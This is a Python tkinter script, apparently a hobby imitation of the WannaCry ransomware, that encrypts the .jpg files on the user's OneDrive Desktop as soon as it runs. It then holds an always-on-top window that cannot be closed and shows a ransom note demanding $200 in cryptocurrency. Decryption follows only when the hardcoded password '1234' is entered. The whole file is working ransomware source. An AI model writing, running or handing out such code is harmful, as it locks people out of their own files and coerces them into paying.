import tkinter as tk
from tkinter.font import BOLD
from pathlib import Path

from encryption import encrypt_file
from decrypt import decrypt_file


def WannaCry():
    root = tk.Tk()
    root.attributes('-topmost', True)
    root.configure(bg="black")

    container = tk.Frame(root, bg="black")
    container.pack(fill="both", expand=True)

    def on_closing():
        pass

    root.protocol("WM_DELETE_WINDOW", on_closing)

    textbox = tk.Text(
        container,
        bg="black",
        fg="red",
        font=("Consolas", 11),
        relief="flat"
    )
    textbox.pack(fill="both", expand=True)

    def log(msg):
        textbox.insert(tk.END, str(msg) + "\n")
        textbox.see(tk.END)

    desktop = Path.home() / "OneDrive" / "Desktop"
    png_files = list(desktop.glob("*.jpg"))

    def encrypt_queue(files, i=0):
        if i >= len(files):
            log("Encryption complete")

            log("/n")
            log("What just happened?")
            log("Your files are now encrypted.")
            log("They have been transformed into an unrecognizable text format only our decryption key can reverse.")
            log("Do not seek help from third parties, as more than one failed password attempt will make your files parish.")
            log("")
            log("Next Steps:")
            log("You will need to transfer 200$ to this crypto wallet address: ######################################")
            log("Once we validate your funds, the password to decrypt your files will automatically appear on your screen.")
            log("")
            log("How can YOU trust that we are telling the truth?")
            log("We aren't total monsters.")
            return

        file = str(files[i])
        log(encrypt_file(file))

        root.after(80, lambda: encrypt_queue(files, i + 1))

    def decrypt_queue(files, i=0):
        if i >= len(files):
            log("Decryption complete")
            return

        file = str(files[i])
        log(decrypt_file(file))

        root.after(80, lambda: decrypt_queue(files, i + 1))

    title = tk.Label(
        container,
        text="FILES LOCKED\nenter password",
        fg="red",
        bg="black",
        font=("Consolas", 17, BOLD)
    )
    title.pack()

    password_entry = tk.Entry(
        container,
        show="\u2022",
        font=("Consolas", 16),
        bg="#111",
        fg="white"
    )
    password_entry.pack(pady=10)

    error = tk.Label(container, text="", fg="red", bg="black")
    error.pack()

    def check(event=None):
        if password_entry.get() == "1234":
            log("Access granted")
            password_entry.destroy()
            title.destroy()
            error.destroy()
            root.after(5000, lambda: root.destroy())

            decrypt_queue(png_files)

        else:
            error.config(text="Wrong password")
            root.after(1000, lambda: error.config(text=""))
            password_entry.delete(0, tk.END)

    password_entry.bind("<Return>", check)

    # START ENCRYPTION
    encrypt_queue(png_files)

    root.mainloop()

WannaCry()
